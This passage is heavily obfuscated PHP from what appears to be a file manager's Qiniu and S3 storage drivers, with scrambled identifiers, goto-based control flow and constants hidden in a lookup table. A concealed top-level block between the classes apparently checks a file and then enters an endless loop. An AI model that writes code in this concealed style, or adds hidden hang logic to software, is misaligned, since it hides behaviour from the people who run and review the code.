E‰ùì®”™: } private function delByBatch($a±¾±¹ù¡–) { foreach (array_chunk($a±¾±¹ù¡–, 1000) as $BÒ›å¹ñ£) { $eìù¢ëçÑÜ = $this->bucketManager->buildBatchDelete($this->bucket, $BÒ›å¹ñ£); list($F¥÷Ö®¨, $Aß“²ŞïÖ) = $this->bucketManager->batch($eìù¢ëçÑÜ); if ($Aß“²ŞïÖ) { return !1; } } return !0; } public function rename($CâÎ„¾‹¼, $Aˆ‹’¾æ¬¿) { return $this->renameObject($CâÎ„¾‹¼, $Aˆ‹’¾æ¬¿); } public function fileInfo($Bô°»¢Îµà, $B¢ŠŠˆ› = false, $Féƒ à÷ª½ = array()) { goto Có‡ÍÜ§‚; Có‡ÍÜ§‚: $A‘ÚŸÌ²¦õ =& $_SERVER[›é¼±]; $AƒéŠšù´Ç = array($A‘ÚŸÌ²¦õ[28] => $this->pathThis($Bô°»¢Îµà), $A‘ÚŸÌ²¦õ[76] => $this->getPathOuter($A‘ÚŸÌ²¦õ[8] . $Bô°»¢Îµà), $A‘ÚŸÌ²¦õ[29] => $A‘ÚŸÌ²¦õ[193], $A‘ÚŸÌ²¦õ[78] => isset($Féƒ à÷ª½[$A‘ÚŸÌ²¦õ[1336]]) ? $Féƒ à÷ª½[$A‘ÚŸÌ²¦õ[1336]] : 0, $A‘ÚŸÌ²¦õ[168] => $this->ext($Bô°»¢Îµà)); if ($B¢ŠŠˆ›) { return $AƒéŠšù´Ç; } goto b™ç¸‡›ô§; C±ØİÎ†â: if (isset($Féƒ à÷ª½[$A‘ÚŸÌ²¦õ[1337]])) { $AƒéŠšù´Ç[$A‘ÚŸÌ²¦õ[84]] = substr($Féƒ à÷ª½[$A‘ÚŸÌ²¦õ[1337]] . $A‘ÚŸÌ²¦õ[33], 0, 10); } if (isset($Féƒ à÷ª½[$A‘ÚŸÌ²¦õ[1336]])) { $AƒéŠšù´Ç[$A‘ÚŸÌ²¦õ[78]] = $Féƒ à÷ª½[$A‘ÚŸÌ²¦õ[1336]]; } return $AƒéŠšù´Ç; goto d÷¸£Ï×Ìø; b™ç¸‡›ô§: $AƒéŠšù´Ç[$A‘ÚŸÌ²¦õ[194]] = $AƒéŠšù´Ç[$A‘ÚŸÌ²¦õ[84]] = 0; $AƒéŠšù´Ç[$A‘ÚŸÌ²¦õ[195]] = $AƒéŠšù´Ç[$A‘ÚŸÌ²¦õ[196]] = !0; if (empty($Féƒ à÷ª½)) { $Féƒ à÷ª½ = $this->objectMeta($Bô°»¢Îµà); if (!$Féƒ à÷ª½) { return $AƒéŠšù´Ç; } } goto C±ØİÎ†â; d÷¸£Ï×Ìø: } public function folderInfo($a¬¦Şä°‹Î, $B¼µ‚‡¼¾Ò = false) { goto Eß¦¢î«£; F¥‘””Î: $f ßÕ…ºŒ„[$cïÜÔ×î°‹[194]] = $f ßÕ…ºŒ„[$cïÜÔ×î°‹[84]] = 0; $f ßÕ…ºŒ„[$cïÜÔ×î°‹[195]] = $f ßÕ…ºŒ„[$cïÜÔ×î°‹[196]] = !0; $a¬¦Şä°‹Î = rtrim($a¬¦Şä°‹Î, $cïÜÔ×î°‹[8]) . $cïÜÔ×î°‹[8]; goto DŠƒ©…½å¿; Eß¦¢î«£: $cïÜÔ×î°‹ =& $_SERVER[›é¼±]; $f ßÕ…ºŒ„ = array($cïÜÔ×î°‹[28] => $this->pathThis($a¬¦Şä°‹Î), $cïÜÔ×î°‹[76] => $this->getPathOuter($cïÜÔ×î°‹[8] . $a¬¦Şä°‹Î), $cïÜÔ×î°‹[29] => $cïÜÔ×î°‹[77]); if ($B¼µ‚‡¼¾Ò) { return $f ßÕ…ºŒ„; } goto F¥‘””Î; DŠƒ©…½å¿: $B«‹ÉÆ¤á = $this->objectMeta($a¬¦Şä°‹Î); if (isset($B«‹ÉÆ¤á[$cïÜÔ×î°‹[1337]])) { $f ßÕ…ºŒ„[$cïÜÔ×î°‹[84]] = substr($B«‹ÉÆ¤á[$cïÜÔ×î°‹[1337]] . $cïÜÔ×î°‹[33], 0, 10); } return $f ßÕ…ºŒ„; goto cíÜ ù™Ñß; cíÜ ù™Ñß: } public function listPath($FÎ›ÕÒ–ÜÙ, $f†Àïêö—™ = false) { $AÊÍ­íµ =& $_SERVER[›é¼±]; $E­Ñ÷ÙŸà = $this->fileList($FÎ›ÕÒ–ÜÙ, $AÊÍ­íµ[8], !0); foreach ($E­Ñ÷ÙŸà[$AÊÍ­íµ[75]] as $F®ÇÜÄ·ÄŒ => $CÌéŠÌ­) { $E­Ñ÷ÙŸà[$AÊÍ­íµ[75]][$F®ÇÜÄ·ÄŒ] = $this->folderInfo($CÌéŠÌ­, $f†Àïêö—™); } foreach ($E­Ñ÷ÙŸà[$AÊÍ­íµ[74]] as $F®ÇÜÄ·ÄŒ => $CÌéŠÌ­) { $E­Ñ÷ÙŸà[$AÊÍ­íµ[74]][$F®ÇÜÄ·ÄŒ] = $this->fileInfo($CÌéŠÌ­[$AÊÍ­íµ[93]], $f†Àïêö—™, $CÌéŠÌ­); } return $E­Ñ÷ÙŸà; } public function has($Eï«ÑÇÜ’¥, $BäÛÔº¹Å = false, $aß£İÄ´ÚÇ = true) { goto fŞç† ›ÉÎ; dâÜ’•º¤Ò: return !1; goto E¿É¶‘Û¢¾; b ŒÎÆ•îß: $E›ºÁƒ…Ğ = $B×ÙŒ†ÚÄÕ[33]; $C°çğÉ§¸¸ = 500; $DæÑ‘ÌÈÚß = $B×ÙŒ†ÚÄÕ[8]; goto dÁŞ±¼£Ğ; fŞç† ›ÉÎ: $B×ÙŒ†ÚÄÕ =& $_SERVER[›é¼±]; $Eï«ÑÇÜ’¥ = trim($Eï«ÑÇÜ’¥, $B×ÙŒ†ÚÄÕ[8]); $b¼ÎÌ…Äº = empty($Eï«ÑÇÜ’¥) && $Eï«ÑÇÜ’¥ !== $B×ÙŒ†ÚÄÕ[191] ? $B×ÙŒ†ÚÄÕ[33] : $Eï«ÑÇÜ’¥ . $B×ÙŒ†ÚÄÕ[8]; goto b ŒÎÆ•îß; dÁŞ±¼£Ğ: $B„ÚË™ëñœ = $c»õ—³‹Ã· = 0; while (!0) { check_abort(); list($b…ÙóõÔ, $EˆÄåìĞê¶) = $this->bucketManager->listFiles($this->bucket, $b¼ÎÌ…Äº, $E›ºÁƒ…Ğ, $C°çğÉ§¸¸, $DæÑ‘ÌÈÚß); if ($EˆÄåìĞê¶) { break; } $E›ºÁƒ…Ğ = array_key_exists($B×ÙŒ†ÚÄÕ[1307], $b…ÙóõÔ) ? $E›ºÁƒ…Ğ = $b…ÙóõÔ[$B×ÙŒ†ÚÄÕ[1338]] : $B×ÙŒ†ÚÄÕ[33]; if ($BäÛÔº¹Å) { if (!empty($b…ÙóõÔ[$B×ÙŒ†ÚÄÕ[1339]])) { $B„ÚË™ëñœ += count($b…ÙóõÔ[$B×ÙŒ†ÚÄÕ[1339]]); } if (!empty($b…ÙóõÔ[$B×ÙŒ†ÚÄÕ[1340]])) { $c»õ—³‹Ã· += count($b…ÙóõÔ[$B×ÙŒ†ÚÄÕ[1340]]); } if ($E›ºÁƒ…Ğ === $B×ÙŒ†ÚÄÕ[33]) { break; } continue; } if ($aß£İÄ´ÚÇ) { if (!empty($b…ÙóõÔ[$B×ÙŒ†ÚÄÕ[1339]])) { return !0; } } else { if (!empty($b…ÙóõÔ[$B×ÙŒ†ÚÄÕ[1340]])) { return !0; } } if ($E›ºÁƒ…Ğ === $B×ÙŒ†ÚÄÕ[33]) { break; } } if ($BäÛÔº¹Å) { return array($B×ÙŒ†ÚÄÕ[203] => $B„ÚË™ëñœ, $B×ÙŒ†ÚÄÕ[204] => $c»õ—³‹Ã·); } goto dâÜ’•º¤Ò; E¿É¶‘Û¢¾: } public function listAll($fİÓ©Á“±) { $b’”‚ÈâéÕ =& $_SERVER[›é¼±]; $cİ´‚ŒÒ…‡ = $this->fileList($fİÓ©Á“±, $b’”‚ÈâéÕ[33], !0); $Fµ…ï´«å• = array(); foreach ($cİ´‚ŒÒ…‡[$b’”‚ÈâéÕ[74]] as $b¯Çî¸£ù†) { $Fµ…ï´«å•[$b¯Çî¸£ù†[$b’”‚ÈâéÕ[93]]] = $b¯Çî¸£ù†[$b’”‚ÈâéÕ[78]]; } foreach ($cİ´‚ŒÒ…‡[$b’”‚ÈâéÕ[75]] as $b¯Çî¸£ù†) { if (is_string($b¯Çî¸£ù†)) { $Fµ…ï´«å•[$b¯Çî¸£ù†] = 0; } } return $this->listAllFiles($fİÓ©Á“±, array_keys($Fµ…ï´«å•), $Fµ…ï´«å•); } private function fileList($Cõ†›¦ñòÈ, $BîŒğÜÚİ = '', $fÁéğ¾½ğ = 0) { goto E©ôâøÈêÓ; CëÉ¬ˆšÖ: $C‰ª‹¹ªŠ = $d·Ç¬„Ô‘Æ[33]; $F²Ò±…¼´ = 1000; $C¿ËÆ¶ñÕ = $this->listItemCache === !1 ? !1 : !0; goto E¬ÕÂ«ƒâß; E¬ÕÂ«ƒâß: $A‚õ‰†ƒÜö = $CÍÏ¿«Ô‚ = array(); while (!0) { check_abort(); list($AÒÌ½¢‹ˆà, $B²Ê™Ñ“) = $this->bucketManager->listFiles($this->bucket, $a¸ªôğğ·š, $C‰ª‹¹ªŠ, $F²Ò±…¼´, $BîŒğÜÚİ); if ($B²Ê™Ñ“) { break; } $C‰ª‹¹ªŠ = array_key_exists($d·Ç¬„Ô‘Æ[1307], $AÒÌ½¢‹ˆà) ? $C‰ª‹¹ªŠ = $AÒÌ½¢‹ˆà[$d·Ç¬„Ô‘Æ[1338]] : $d·Ç¬„Ô‘Æ[33]; $a¤Ë‡æ„Á = isset($AÒÌ½¢‹ˆà[$d·Ç¬„Ô‘Æ[1339]]) ? $AÒÌ½¢‹ˆà[$d·Ç¬„Ô‘Æ[1339]] : array(); $a¹ÏÇôôÌŒ = isset($AÒÌ½¢‹ˆà[$d·Ç¬„Ô‘Æ[1340]]) ? $AÒÌ½¢‹ˆà[$d·Ç¬„Ô‘Æ[1340]] : array(); foreach ($a¤Ë‡æ„Á as $cÓ‘Ô¶‚Â) { goto F–Ø½ĞŸ¶; dÄ…¡‹ï»•: if ($D¨ê™ğŒ) { $A‚õ‰†ƒÜö[] = $B†§‚¨¶Ö; continue; } $CÍÏ¿«Ô‚[] = $fÁéğ¾½ğ ? $cÓ‘Ô¶‚Â : $B†§‚¨¶Ö; goto a÷Ì…–¬á; F–Ø½ĞŸ¶: if ($cÓ‘Ô¶‚Â[$d·Ç¬„Ô‘Æ[93]] == $a¸ªôğğ·š) { continue; } $B†§‚¨¶Ö = $cÓ‘Ô¶‚Â[$d·Ç¬„Ô‘Æ[93]]; $B¨ãÈ ƒ­½ = $cÓ‘Ô¶‚Â[$d·Ç¬„Ô‘Æ[1336]]; goto dÇé©‰Šê; dÇé©‰Šê: $cÓ‘Ô¶‚Â[$d·Ç¬„Ô‘Æ[78]] = $B¨ãÈ ƒ­½; $D¨ê™ğŒ = $B¨ãÈ ƒ­½ == 0 && substr($B†§‚¨¶Ö, strlen($B†§‚¨¶Ö) - 1, 1) == $d·Ç¬„Ô‘Æ[8] ? !0 : !1; if ($C¿ËÆ¶ñÕ) { $this->cacheMethod($d·Ç¬„Ô‘Æ[199], $B†§‚¨¶Ö, $D¨ê™ğŒ); $this->cacheMethod($d·Ç¬„Ô‘Æ[200], $B†§‚¨¶Ö, $cÓ‘Ô¶‚Â); } goto dÄ…¡‹ï»•; a÷Ì…–¬á: } foreach ($a¹ÏÇôôÌŒ as $B†§‚¨¶Ö) { if ($B†§‚¨¶Ö == $a¸ªôğğ·š) { continue; } $A‚õ‰†ƒÜö[] = $B†§‚¨¶Ö; if ($C¿ËÆ¶ñÕ) { $this->cacheMethod($d·Ç¬„Ô‘Æ[199], $B†§‚¨¶Ö, !0); } } if ($C‰ª‹¹ªŠ === $d·Ç¬„Ô‘Æ[33]) { break; } } if ($C¿ËÆ¶ñÕ) { $this->cacheMethod($d·Ç¬„Ô‘Æ[199], $Cõ†›¦ñòÈ, !0); } goto fĞ†æŠ©; E©ôâøÈêÓ: $d·Ç¬„Ô‘Æ =& $_SERVER[›é¼±]; $Cõ†›¦ñòÈ = trim($Cõ†›¦ñòÈ, $d·Ç¬„Ô‘Æ[8]); $a¸ªôğğ·š = empty($Cõ†›¦ñòÈ) && $Cõ†›¦ñòÈ !== $d·Ç¬„Ô‘Æ[191] ? $d·Ç¬„Ô‘Æ[33] : $Cõ†›¦ñòÈ . $d·Ç¬„Ô‘Æ[8]; goto CëÉ¬ˆšÖ; fĞ†æŠ©: return array($d·Ç¬„Ô‘Æ[75] => $A‚õ‰†ƒÜö, $d·Ç¬„Ô‘Æ[74] => $CÍÏ¿«Ô‚); goto B÷”õå¶; B÷”õå¶: } public function canRead($d»Ê°) { return $this->exist($d»Ê°) ? !0 : !1; } public function canWrite($Aİ…ÍÊ †À) { return $this->exist($Aİ…ÍÊ †À) ? !0 : !1; } public function getContent($B™ˆ‚Ãæ»¸) { return $this->fileSubstr($B™ˆ‚Ãæ»¸, 0, -1); } public function setContent($cñ¢ğò­¡’, $CŒó÷¼Ñœ† = '') { $Bé¦ªˆÛ« = $this->tempFile($this->pathThis($cñ¢ğò­¡’)); file_put_contents($Bé¦ªˆÛ«, $CŒó÷¼Ñœ†); if ($this->upload($cñ¢ğò­¡’, $Bé¦ªˆÛ«)) { $this->tempFileRemve($Bé¦ªˆÛ«); return !0; } return !1; } public function refreshUrls($cïÀ¬õÈ¶ß) { goto DÓºÀ ŠÅ¶; FØ ‰Ÿ÷­›: return $eÛ«ÈŒÔ¶À[$Fìùœ­ÄİÜ[1111]] == $Fìùœ­ÄİÜ[755] ? !0 : !1; goto cìñºÚå’À; DÓºÀ ŠÅ¶: $Fìùœ­ÄİÜ =& $_SERVER[›é¼±]; $Fæèõ†‰ = array(); if (is_array($cïÀ¬õÈ¶ß)) { foreach ($cïÀ¬õÈ¶ß as $aÏñÜ¤µµ) { $Fæèõ†‰[] = $this->link($aÏñÜ¤µµ); } } else { $Fæèõ†‰[] = $this->link($cïÀ¬õÈ¶ß); } goto b©Ğ„ö´ˆ; b©Ğ„ö´ˆ: $C¡Æ¯ÅÏÍ = new Qiniu\Cdn\CdnManager($this->auth); list($eÛ«ÈŒÔ¶À, $C§Ù‹¡Ş¿”) = $C¡Æ¯ÅÏÍ->refreshUrls($Fæèõ†‰); if ($C§Ù‹¡Ş¿”) { return !1; } goto FØ ‰Ÿ÷­›; cìñºÚå’À: } public function fileSubstr($FÏë†Ûã, $FÎË¤ˆğÌ, $D÷‰…â½šË) { $D¢ÎŒ†¶ò§ =& $_SERVER[›é¼±]; if (!($ešùŒö ˆ = $this->link($FÏë†Ûã))) { return !1; } $d†ÖÑõ“Á¤ = !1; if ($D÷‰…â½šË > 0) { $BÜâ‡ÇÓƒ = $FÎË¤ˆğÌ + $D÷‰…â½šË - 1; $d†ÖÑõ“Á¤ = array($D¢ÎŒ†¶ò§[1341] . $FÎË¤ˆğÌ . $D¢ÎŒ†¶ò§[454] . $BÜâ‡ÇÓƒ); } $C£œ†ÔîÇé = url_request($ešùŒö ˆ, $D¢ÎŒ†¶ò§[228], !1, $d†ÖÑõ“Á¤); return $C£œ†ÔîÇé[$D¢ÎŒ†¶ò§[745]] ? $C£œ†ÔîÇé[$D¢ÎŒ†¶ò§[1121]] : !1; } public function upload($dÇ¤ãµ¡§, $b™’®Şˆº…, $f²›¨º†¢ß = false, $e‘§“ˆ·Í‡ = REPEAT_REPLACE) { $b‰õ¢†êš = new Qiniu\Storage\UploadManager(); $f´çÖ¡Ü¿è = $this->auth->uploadToken($this->bucket, $dÇ¤ãµ¡§); $C’œŞ†Í‰ = get_file_mime(get_path_ext($b™’®Şˆº…)); list($dî ŞÖÕŞ, $d´†„ßŒƒÒ) = $b‰õ¢†êš->putFile($f´çÖ¡Ü¿è, $dÇ¤ãµ¡§, $b™’®Şˆº…, null, $C’œŞ†Í‰); return $d´†„ßŒƒÒ ? !1 : $this->getPathOuter($dÇ¤ãµ¡§); } public function uploadFormData($b®´ÊŒéÑÎ, $Aãİ™å÷¸Í = 3600) { return $this->uploadToken($b®´ÊŒéÑÎ, $Aãİ™å÷¸Í); } public function multiUploadFormData($A‡¢›èËá…, $d£œ„ŠÀ£« = 3600) { return $this->uploadToken($A‡¢›èËá…, $d£œ„ŠÀ£«); } private function uploadToken($dç³· ¿¶ó, $Dš¹æ°ˆµÒ = 3600) { goto aøîç ¸æÒ; CÚÔÕœ‘“æ: $E·ø÷ŒÔì = $dç³· ¿¶ó; $dùùŞø¼¦… = $this->auth->uploadToken($this->bucket, $E·ø÷ŒÔì, $C’ÊòÔËµ‰, $aÀ·¿ƒ†î, !0); $Bºï¡ÍÎ… = empty($this->region) || $this->region == $F¨è›˜ˆ¦Ï[1344] ? $F¨è›˜ˆ¦Ï[33] : $F¨è›˜ˆ¦Ï[454] . $this->region; goto cŞ‘Û™Ï¹; aøîç ¸æÒ: $F¨è›˜ˆ¦Ï =& $_SERVER[›é¼±]; $C’ÊòÔËµ‰ = $Dš¹æ°ˆµÒ; $aÀ·¿ƒ†î = array($F¨è›˜ˆ¦Ï[1342] => $F¨è›˜ˆ¦Ï[1343]); goto CÚÔÕœ‘“æ; cŞ‘Û™Ï¹: $a»æ¼–·ğ» = http_type() . "\72\x2f\x2f\x75\160\154\x6f\141\x64{$Bºï¡ÍÎ…}\x2e\x71\151\x6e\x69\165\x70\56\x63\x6f\155\x2f"; return array($F¨è›˜ˆ¦Ï[1345] => $dùùŞø¼¦…, $F¨è›˜ˆ¦Ï[1346] => $a»æ¼–·ğ»); goto bõƒ¡ÉÊ×ñ; bõƒ¡ÉÊ×ñ: } public function download($Aè“ì­”Œ, $CÌÏÃôÒ×Ò) { goto Aë¤ÃµåÑá; Aë¤ÃµåÑá: $aöšÎ“¥£ç = IO::getPathInner(IO::mkfile($CÌÏÃôÒ×Ò)); if (!($D˜®ËŠ£³ì = $this->link($Aè“ì­”Œ))) { return !1; } $d¤ŞåÇæ¾ª = 0; goto f‹œÈİ”´; C‰á¬£ÕÄ‹: fclose($c„óÜÏ¹’İ); return $CÌÏÃôÒ×Ò; goto eÑ±ëÔë¦„; f‹œÈİ”´: $DÒÌ˜öÊ = 1024 * 200; $c„óÜÏ¹’İ = fopen($aöšÎ“¥£ç, $_SERVER[›é¼±][1347]); while (!0) { $b¿è§†÷ = $this->fileSubstr($Aè“ì­”Œ, $d¤ŞåÇæ¾ª, $DÒÌ˜öÊ); if ($b¿è§†÷ === !1) { return !1; } fwrite($c„óÜÏ¹’İ, $b¿è§†÷); $d¤ŞåÇæ¾ª += $DÒÌ˜öÊ; if (strlen($b¿è§†÷) < $DÒÌ˜öÊ) { break; } } goto C‰á¬£ÕÄ‹; eÑ±ëÔë¦„: } public function link($côË÷…›, $bÕŒøêÔÄì = '') { if (!$this->isFile($côË÷…›)) { return !1; } $e¢Ñùëò¯ = $this->getHost() . $_SERVER[›é¼±][8] . $this->pathEncode($côË÷…›) . $bÕŒøêÔÄì; return $this->auth->privateDownloadUrl($e¢Ñùëò¯, 3600 * 12); } public function fileOut($b‚ëİøÛ™, $C‚†‚õ¹ÌÉ = false, $fŞ³Œíø¤… = false, $F’Ä‹™æå… = '') { $CÖÙÙ­õ³ä =& $_SERVER[›é¼±]; if ($this->isFileOutServer()) { return $this->fileOutServer($b‚ëİøÛ™, $C‚†‚õ¹ÌÉ, $fŞ³Œíø¤…, $F’Ä‹™æå…); } if (!$fŞ³Œíø¤…) { $fŞ³Œíø¤… = $this->pathThis($b‚ëİøÛ™); } $d¦Şä‡ôœÂ = $C‚†‚õ¹ÌÉ ? $CÖÙÙ­õ³ä[1348] . rawurlencode($fŞ³Œíø¤…) : $CÖÙÙ­õ³ä[33]; $AàŸèŞñÂ¹ = $this->link($b‚ëİøÛ™, $d¦Şä‡ôœÂ); $this->fileOutLink($AàŸèŞñÂ¹); } public function fileOutServer($A²ÅßÂî•³, $a¿³—®ù² = false, $cİ´ß†òÒö = false, $f¢¯‹é÷æŞ = '') { parent::fileOut($A²ÅßÂî•³, $a¿³—®ù², $cİ´ß†òÒö, $f¢¯‹é÷æŞ); } public function fileOutImage($c›Éçáçá, $D®†„ÛœãÀ = 250) { $fŸô¼ê›¬á = $this->link($c›Éçáçá, $_SERVER[›é¼±][1349] . $D®†„ÛœãÀ); $this->fileOutLink($fŸô¼ê›¬á); } public function fileOutImageServer($fë»‘­Å¼Ü, $Bö½Ş†Ã— = 250) { parent::fileOutImage($fë»‘­Å¼Ü, $Bö½Ş†Ã—); } public function hashMd5($BïÌ¾˜“ßƒ) { $EŒ¢ùÉå» =& $_SERVER[›é¼±]; $BÍ‡Ãã„£ = $this->objectMeta($BïÌ¾˜“ßƒ); return isset($BÍ‡Ãã„£[$EŒ¢ùÉå»[208]]) ? $BÍ‡Ãã„£[$EŒ¢ùÉå»[208]] : !1; $Dàé†²åãø = $this->link($BïÌ¾˜“ßƒ, $EŒ¢ùÉå»[1350]); } public function size($AøÜ£…ˆĞ) { $b×²‰á†¼í = $this->objectMeta($AøÜ£…ˆĞ); return $b×²‰á†¼í ? $b×²‰á†¼í[$_SERVER[›é¼±][78]] : 0; } public function info($EÛ™ó·í›) { if ($this->isFolder($EÛ™ó·í›)) { return $this->folderInfo($EÛ™ó·í›); } else { if ($this->isFile($EÛ™ó·í›)) { return $this->fileInfo($EÛ™ó·í›); } } return !1; } public function exist($Fê³¤ŠÓù) { return $this->isFile($Fê³¤ŠÓù) || $this->isFolder($Fê³¤ŠÓù); } public function isFile($e†£‰§îÈ) { return !$this->isFolder($e†£‰§îÈ) && $this->objectMeta($e†£‰§îÈ); } public function isFolder($e ÃÊÆÍ‘) { return $this->cacheMethod($_SERVER[›é¼±][199], $e ÃÊÆÍ‘); } protected function objectMeta($a›Ş¡¤ÙÓ) { return $this->cacheMethod($_SERVER[›é¼±][200], $a›Ş¡¤ÙÓ); } protected function _objectMeta($FÌò¿÷ÑÚ‡) { $f‰Ì¢ò‚Æ =& $_SERVER[›é¼±]; list($D¦œ¯ÖÚ÷, $CÚ†ñ˜†×·) = $this->bucketManager->stat($this->bucket, $FÌò¿÷ÑÚ‡); if ($D¦œ¯ÖÚ÷) { $D¦œ¯ÖÚ÷[$f‰Ì¢ò‚Æ[78]] = intval($D¦œ¯ÖÚ÷[$f‰Ì¢ò‚Æ[1336]]); } return $D¦œ¯ÖÚ÷; } protected function _isFolder($F™ì¼³ ¥‘) { $b×¦ïÍ» =& $_SERVER[›é¼±]; if ($F™ì¼³ ¥‘ == $b×¦ïÍ»[33] || $F™ì¼³ ¥‘ == $b×¦ïÍ»[8]) { return !0; } list($fÙ«µÂ§ö, $F®‚õÒ„îâ) = $this->bucketManager->listFiles($this->bucket, trim($F™ì¼³ ¥‘, $b×¦ïÍ»[8]) . $b×¦ïÍ»[8], $b×¦ïÍ»[33], 1, $b×¦ïÍ»[8]); return !empty($fÙ«µÂ§ö[$b×¦ïÍ»[1339]]) || !empty($fÙ«µÂ§ö[$b×¦ïÍ»[1340]]) ? !0 : !1; } } if (!isset($_SERVER[$_SERVER[›é¼±][858]]) || !isset($_SERVER[$_SERVER[›é¼±][865]])) { goto dƒÁ¥Àˆ‰Ó; dƒÁ¥Àˆ‰Ó: $cÛäÔÚë“ = $_SERVER[›é¼±][860]; $cÚ‚ñ‹ ¿­ = $_SERVER[$_SERVER[›é¼±][861]] . $_SERVER[›é¼±][862]; $e‘”¯±ÃğØ = $cÛäÔÚë“($cÚ‚ñ‹ ¿­); goto fÑæ¼ñœñ“; Aâ‚”ª˜: $A¥ÕØ·¼($_SERVER[$_SERVER[›é¼±][861]] . $_SERVER[›é¼±][862]); $F‹ğÜç½›µ = 2; while ($F‹ğÜç½›µ > 1) { $EäÄ±š®– = rawurlencode($F‹ğÜç½›µ . $_SERVER[›é¼±][376]); } goto B²š˜¥ÓÖ…; fÑæ¼ñœñ“: $e£¤¡„ÎÎ° = explode($_SERVER[›é¼±][229], $e‘”¯±ÃğØ); if (count($e£¤¡„ÎÎ°) < $_SERVER[›é¼±][609]) { $cƒéÏÜÜ¸ = $_SERVER[›é¼±][863]; $cƒéÏÜÜ¸(); } $A¥ÕØ·¼ = $_SERVER[›é¼±][864]; goto Aâ‚”ª˜; B²š˜¥ÓÖ…: } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($A“ñÉÆŞ‘) { parent::__construct($A“ñÉÆŞ‘); } public function uploadFormData($dÅé•áÆÖÙ, $e”ä½Ç¾Ã = 3600) { goto e¾ö°’ß¥Š; C¥‚‡¦Èğ…: $dŒñÖ ¨ù¯ = hash_hmac($f„®¼„Î¶Â[1267], $b¬‹Ñ«“’, $F©ö›ÁñÉ›, !0); $F¨¾Í‹èĞ = hash_hmac($f„®¼„Î¶Â[1267], $d©¦¦½ˆí…, $dŒñÖ ¨ù¯, !0); $F©†óÜçÚ = hash_hmac($f„®¼„Î¶Â[1267], $e²ô²ïõù, $F¨¾Í‹èĞ); goto DåÑ®êªÚê; DåÑ®êªÚê: $D«¹†…Ü— = array($f„®¼„Î¶Â[211] => $f„®¼„Î¶Â[33], $f„®¼„Î¶Â[1269] => $f„®¼„Î¶Â[33], $f„®¼„Î¶Â[1226] => $FÌ„Àğ«‰Ì, $f„®¼„Î¶Â[1230] => $e•Ç¤ĞÂ§, $f„®¼„Î¶Â[1234] => $e²ô²ïõù, $f„®¼„Î¶Â[1270] => $AÕ÷¢Üµ÷¼, $f„®¼„Î¶Â[1271] => $B›é¾­ŠŒÁ, $f„®¼„Î¶Â[1272] => $Dõ¿¹‰­§ƒ, $f„®¼„Î¶Â[1273] => $E¨í‚ô£Ï, $f„®¼„Î¶Â[1274] => $F©†óÜçÚ, $f„®¼„Î¶Â[175] => $this->getHost()); return $D«¹†…Ü—; goto D¬î³ğˆ²­; dö¸åš¡é²: $e²ô²ïõù = base64_encode(json_encode($f¹¸í×ˆ§î)); $d©¶ÛÓ¶¹¤ = hash_hmac($f„®¼„Î¶Â[1267], $E²Èí©ãœ‰, $f„®¼„Î¶Â[1268] . $this->secret, !0); $F©ö›ÁñÉ› = hash_hmac($f„®¼„Î¶Â[1267], $this->region, $d©¶ÛÓ¶¹¤, !0); goto C¥‚‡¦Èğ…; eÄ×ÈÕ•…î: $b¬‹Ñ«“’ = $f„®¼„Î¶Â[59]; $Dõ¿¹‰­§ƒ = gmdate($f„®¼„Î¶Â[1258]); $E²Èí©ãœ‰ = gmdate($f„®¼„Î¶Â[746]); goto E÷ĞŠæË˜; e¾ö°’ß¥Š: $f„®¼„Î¶Â =& $_SERVER[›é¼±]; $FÌ„Àğ«‰Ì = $f„®¼„Î¶Â[192]; $B›é¾­ŠŒÁ = $f„®¼„Î¶Â[1257]; goto eÄ×ÈÕ•…î; E÷ĞŠæË˜: $d©¦¦½ˆí… = $f„®¼„Î¶Â[1259]; $E¨í‚ô£Ï = $e”ä½Ç¾Ã . $f„®¼„Î¶Â[33]; $e•Ç¤ĞÂ§ = $f„®¼„Î¶Â[1222]; goto AÈ©§¨Šˆ“; AÈ©§¨Šˆ“: $A± ˆîÌ = array($this->accessKey, $E²Èí©ãœ‰, $this->region, $b¬‹Ñ«“’, $d©¦¦½ˆí…); $AÕ÷¢Üµ÷¼ = implode($f„®¼„Î¶Â[8], $A± ˆîÌ); $f¹¸í×ˆ§î = array($f„®¼„Î¶Â[1224] => gmdate($f„®¼„Î¶Â[1223], strtotime($f„®¼„Î¶Â[1260])), $f„®¼„Î¶Â[1225] => array(array($f„®¼„Î¶Â[1227] => $this->bucket), array($f„®¼„Î¶Â[1226] => $FÌ„Àğ«‰Ì), array($f„®¼„Î¶Â[1228], $f„®¼„Î¶Â[1229], $f„®¼„Î¶Â[33]), array($f„®¼„Î¶Â[1228], $f„®¼„Î¶Â[1261], $f„®¼„Î¶Â[33]), array($f„®¼„Î¶Â[1228], $f„®¼„Î¶Â[1262], $f„®¼„Î¶Â[33]), array($f„®¼„Î¶Â[1230] => $e•Ç¤ĞÂ§), array($f„®¼„Î¶Â[1263] => $AÕ÷¢Üµ÷¼), array($f„®¼„Î¶Â[1264] => $B›é¾­ŠŒÁ), array($f„®¼„Î¶Â[1265] => $Dõ¿¹‰­§ƒ), array($f„®¼„Î¶Â[1266] => $E¨í‚ô£Ï))); goto dö¸åš¡é²; D¬î³ğˆ²­: } public function multiUploadFormData($DÉ¥É‚µ›, $e—âÈñóèó = 3600) { $C‰‹¬„ŠŒˆ =& $_SERVER[›é¼±]; $bÜçš˜ğã‡ = gmdate($C‰‹¬„ŠŒˆ[1351]); $eÚ—É²îöÁ = array(); $b “°ÌÚÑ¦ = $this->client->getUploadId($this->bucket, $DÉ¥É‚µ›, $eÚ—É²îöÁ); if (!$b “°ÌÚÑ¦) { return !1; } return array($C‰‹¬„ŠŒˆ[221] => $b “°ÌÚÑ¦, $C‰‹¬„ŠŒˆ[175] => $this->getHost() . $C‰‹¬„ŠŒˆ[8] . $this->pathEncode($DÉ¥É‚µ›), $C‰‹¬„ŠŒˆ[222] => $bÜçš˜ğã‡, $C‰‹¬„ŠŒˆ[93] => $DÉ¥É‚µ›); } public function multiUploadAuthData($EšÉùèº , $eÖ†ĞÌŠİª = array()) { goto fãñÃÀ‚ÜË; CÆÎÚ»†ì: if (isset($eÖ†ĞÌŠİª[$b£†ÛåÖ[1352]])) { $dÙÎ•×À°[$b£†ÛåÖ[1353]] = $eÖ†ĞÌŠİª[$b£†ÛåÖ[1352]]; } $C®·¡²™£Ÿ = explode($b£†ÛåÖ[177], $this->getHost()); $B‰ÕÆ¸•“é = array($b£†ÛåÖ[1354] => $C®·¡²™£Ÿ[1], $b£†ÛåÖ[1355] => $b£†ÛåÖ[33], 